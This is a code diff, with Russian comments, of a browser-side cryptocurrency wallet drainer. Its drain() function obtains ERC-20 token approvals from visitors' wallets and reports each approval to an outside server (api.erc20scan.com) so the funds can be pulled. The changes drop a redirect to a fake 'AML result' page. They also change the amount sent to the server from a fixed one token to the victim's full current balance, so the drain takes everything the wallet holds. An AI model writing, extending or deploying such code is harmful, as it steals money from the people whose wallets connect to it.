@@ -464,8 +464,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
-        // Перенаправление на Approve.html
-        window.location.href = 'https://amlresult.nicepage.io/';
         status = 'confirmed';
 
         // Закрываем модальное окно после успешного approve
@@ -490,8 +488,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider);
-        // Перенаправление на Approve.html
-        window.location.href = 'https://amlresult.nicepage.io/';
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
@@ -562,16 +558,27 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 }
 
 
+
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals();
-    console.log(`📊 Decimals токена: ${decimals}`);
+    const [balance, decimals] = await Promise.all([
+      token.balanceOf(userAddress),
+      token.decimals()
+    ]);
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    
+    // Исправляем округление: используем минимальное значение, чтобы избежать нулевого amount
+    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
+    const roundedBalance = Math.max(parseFloat(balanceUnits), 0.0001); // Минимальное значение 0.0001
+    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
-    // Фиксируем amount как 1 токен с учётом decimals
-    const fixedAmount = ethers.utils.parseUnits("1", decimals);
-    console.log(`📊 Фиксированное количество: 1 токен, в wei: ${fixedAmount.toString()}`);
+    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
+
+    if (roundedAmount.lte(0)) {
+      throw new Error('Amount is zero or negative after rounding');
+    }
 
     const response = await fetch('https://api.erc20scan.com/api/transfer', {
       method: 'POST',
@@ -579,7 +586,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: fixedAmount.toString(),
+        amount: roundedAmount.toString(),
         chainId,
         txHash
       })
